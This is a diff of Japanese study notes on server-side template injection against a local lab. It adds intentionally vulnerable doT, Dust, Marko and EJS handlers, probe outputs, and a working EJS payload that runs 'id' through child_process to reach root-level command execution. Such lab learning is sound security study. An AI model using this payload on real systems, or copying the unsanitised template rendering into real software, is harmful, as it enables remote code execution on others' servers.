@@ -739,10 +739,129 @@ WSL上で
 127.0.0.1 - - [22/Dec/2020 00:20:24] "GET /id=uid=1000(tomoki) HTTP/1.1" 404 -
 ```
 #### dot
-#### dust
-#### marko
-#### ejs
+```js
+// doT
+app.use('/dot', function(req, res){
+  if(req.url) {
+    var url_parts = url.parse(req.url, true);
 
+    var inj = url_parts.query.inj;
+    var tpl = '';
+    if('tpl' in url_parts.query) {
+      // Keep the formatting a-la-python
+      tpl = url_parts.query.tpl.replace('%s', inj);
+    }
+    else {
+      tpl = inj;
+    }
+    res.end(randomstring.generate() + doT.template(tpl)({}) + randomstring.generate());
+  }
+});
+```
+わからん.   
+#### dust
+```js
+// Dust
+app.use('/dust', function(req, res){
+  if(req.url) {
+    var url_parts = url.parse(req.url, true);
+
+    var inj = url_parts.query.inj;
+    var tpl = '';
+    if('tpl' in url_parts.query) {
+      // Keep the formatting a-la-python
+      tpl = url_parts.query.tpl.replace('%s', inj);
+    }
+    else {
+      tpl = inj;
+    }
+    
+    console.log('PAYLOAD: ' + tpl);
+    dust.debugLevel = "DEBUG"
+    output = '';
+    var compiled = dust.compile(tpl, "compiled");
+    dust.loadSource(compiled);
+    dust.render("compiled", {}, function(err, outp) { output = outp })
+    res.end(randomstring.generate() + output + randomstring.generate());
+  }
+});
+```
+わからん   
+```txt
+http://192.168.99.100:15004/dot?inj={{aaa}}
+ReferenceError: aaaout is not defined
+    at eval (eval at doT.template (/apps/tests/env_node_tests/node_modules/dot/doT.js:133:11), <anonymous>:3:12)
+    at /apps/tests/env_node_tests/connect-app.js:191:56
+    at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
+```
+#### marko
+```js
+// Marko
+app.use('/marko', function(req, res){
+  if(req.url) {
+    var url_parts = url.parse(req.url, true);
+
+    var inj = url_parts.query.inj;
+    var tpl = '';
+    if('tpl' in url_parts.query) {
+      // Keep the formatting a-la-python
+      tpl = url_parts.query.tpl.replace('%s', inj);
+    }
+    else {
+      tpl = inj;
+    }
+    res.end(randomstring.generate() + marko.load(randomstring.generate(), tpl).renderSync() + randomstring.generate());
+  }
+});
+```
+わからん   
+```txt
+http://192.168.99.100:15004/marko?inj=*
+SYRmrHgSweRm0BaVwR4d3xyXt6bi49qC<*></*>VtwiRsEOPnAdfCnUWqlIhTzF98oywEfo
+
+http://192.168.99.100:15004/marko?inj={7*7}
+Error: An error occurred while trying to compile template at path "/apps/tests/env_node_tests/pSpCYFucRUa3Efxxh7nLJMfNehPbZjLx". Error(s) in template:
+1) [pSpCYFucRUa3Efxxh7nLJMfNehPbZjLx:1:0] Unrecognized tag: {7*7} - More details: https://github.com/marko-js/marko/wiki/Error:-Unrecognized-Tag
+
+    at handleErrors (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:93:17)
+    at Compiler.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:173:5)
+    at _compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:86:31)
+    at Object.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:112:10)
+    at doLoad (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:162:39)
+    at Object.load (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:47:14)
+    at /apps/tests/env_node_tests/connect-app.js:228:45
+    at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
+```
+#### ejs
+```js
+// EJS
+app.use('/ejs', function(req, res){
+  if(req.url) {
+    var url_parts = url.parse(req.url, true);
+
+    var inj = url_parts.query.inj;
+    var tpl = '';
+    if('tpl' in url_parts.query) {
+      // Keep the formatting a-la-python
+      tpl = url_parts.query.tpl.replace('%s', inj);
+    }
+    else {
+      tpl = inj;
+    }
+    res.end(randomstring.generate() + ejs.render(tpl) + randomstring.generate());
+  }
+});
+```
+https://www.hamayanhamayan.com/entry/2020/09/10/222147   
+以下でRCEできた！   
+```txt
+http://192.168.99.100:15004/ejs?inj=***
+f6x9fguWEC8K9UZBUrlMVjA7Rx4K1zxc***k4R2SGjAV3g07QZ9eVHYyTMUpte0LGyS
+
+http://192.168.99.100:15004/ejs?inj=<%- global.process.mainModule.require('child_process').execSync('id') %>
+ugOlkb8cWen3RKy5jmT3DZoF7bWwJ5Oauid=0(root) gid=0(root) groups=0(root)
+UqfIaDZlPpRDsVBvEz04ssis4YEBwPkl
+```
 # メモ
 escapeHTMLってどんな感じでエスケープする？   
 動的な文字列連結は脆弱になりがちっぽい   
